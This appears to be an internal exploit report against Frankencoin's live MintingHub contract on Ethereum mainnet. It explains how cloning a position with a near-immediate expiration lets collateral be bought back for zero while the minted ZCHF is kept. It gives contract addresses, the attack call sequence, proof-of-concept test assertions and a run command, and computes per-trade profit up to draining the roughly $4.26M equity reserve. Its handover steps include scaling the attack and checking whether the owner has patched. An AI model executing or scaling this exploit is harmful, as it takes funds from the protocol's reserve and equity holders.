# EX-02 — FrankenCoin: near-expiry clone buys collateral for zero

**Net for an unprivileged actor:** **$7,596.60** per 10 WETH after 48h capital cost and gas (gross $7,602.70)
**Confidence:** HIGH
**Gate:** capital only — 10 WETH + 48 hours
**Chain:** Ethereum mainnet (1)
**Status:** headline 5.1 is PATCHED; this is the generalized live form of 5.3.

## Contracts

| Role | Address |
|---|---|
| MintingHub | `0xDe12B620A8a714476A97EfD14E6F7180Ca653557` |
| ZCHF | `0xB58E61C3098d85632Df34EecfB899A1Ed80921cB` |
| WETH | `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2` |
| Reserve / equity | `0x1bA26788dfDe592fec8bcB0Eaff472a42BE341B2` |
| Cloneable parent used in PoC | `0x4173E7938F2dE77d567633eA9c93f16fb022e329` (challengePeriod 86,400s, price 844.213 ZCHF/WETH) |

Live state: `equity()` ≈ 3,550,551 ZCHF; 72 live cloneable positions; ZCHF price $1.2008.

## Bug

`MintingHub.clone(parent, coll, mint, expiration)` accepts any `expiration >= block.timestamp`. `Position.initialize` only rejects an already-expired clone. A clone with `expiration = now + 60s` is accepted, and it inherits the parent's `challengePeriod` (86,400s in the PoC parent). After `2 * challengePeriod`, `expiredPurchasePrice` is 0, so anyone can call `buyExpiredCollateral` and buy the collateral for 0. The clone's minted ZCHF stays with the attacker; the shortfall is covered by the equity reserve through `forceSale` → `zchf.coverLoss`.

The headline 5.1 front-run is patched (`_adjustPrice` has the `alive` modifier), but this path does not need the front-run.

## Step-by-step

```
clone(parent, 10 WETH, 8,442.13 ZCHF, now + 60)
warp(expiration + 2 * 86_400 + 1)
expiredPurchasePrice == 0
buyExpiredCollateral(position, 10 WETH)
// attacker keeps 8,442.13 ZCHF and recovers 10 WETH; equity drops by ~6,331.6 ZCHF
```

## PoC

`stage3/work/S3-024/FrankenCoin_Audit_0xDe12B6/poc/src/PoC.t.sol`

Key assertions:

```solidity
require(wethAfter == coll, "collateral not recovered");
require(zchfFinal > zchfBefore, "no profit");
require(equityAfter < equityBefore, "equity not drained");
require(px == 0, "price not zero");
```

Run:

```bash
cd stage3/work/S3-024/FrankenCoin_Audit_0xDe12B6/poc
RPC_URL=<ethereum-rpc> /workspaces/CA/research/tools/foundry/forge test \
  --match-test testCloneNearExpiry -vv
```

## Economics

- 10 WETH collateral → 8,442.13 ZCHF minted at 844.213 ZCHF/WETH.
- After 48h, buy back 10 WETH for 0.
- Attacker net +6,331.60 ZCHF = $7,602.70 gross; $7,596.60 after gas and 48h capital cost.
- Ceiling: the equity reserve (~3.55M ZCHF, ~$4.26M) at ~5,608 WETH of 48h capital.

## Evidence

- `evidence/positions_raw.json` / `positions_bal.json` — live positions, parent challengePeriod and availableForClones.
- `evidence/src/contracts/MintingHubV2/` — verified `MintingHub.sol`, `Position.sol`, `PositionFactory.sol`.
- `evidence/zchf/contracts/` — `Frankencoin.sol`, `Equity.sol`.
- PoC output: `poc/poc_result.txt`.

## Risks / caveats

- The parent must remain live and cloneable; the PoC uses a live 86,400s parent.
- The clone's expiration must be ≥ now; 60s works, but the attacker must wait 2×challengePeriod before buying.
- Equity must be large enough to cover the loss; it is.
- If the owner patches `clone`/`initialize` to enforce a minimum expiration or a maximum challenge period, the path closes.

## Handover

1. Re-run the PoC at the latest block against a currently live cloneable parent.
2. Verify `expiredPurchasePrice == 0` and the equity drop.
3. Size up until the equity reserve or available collateral limits; compute 48h capital cost.
4. Check whether the owner has patched `clone` since the PoC block.
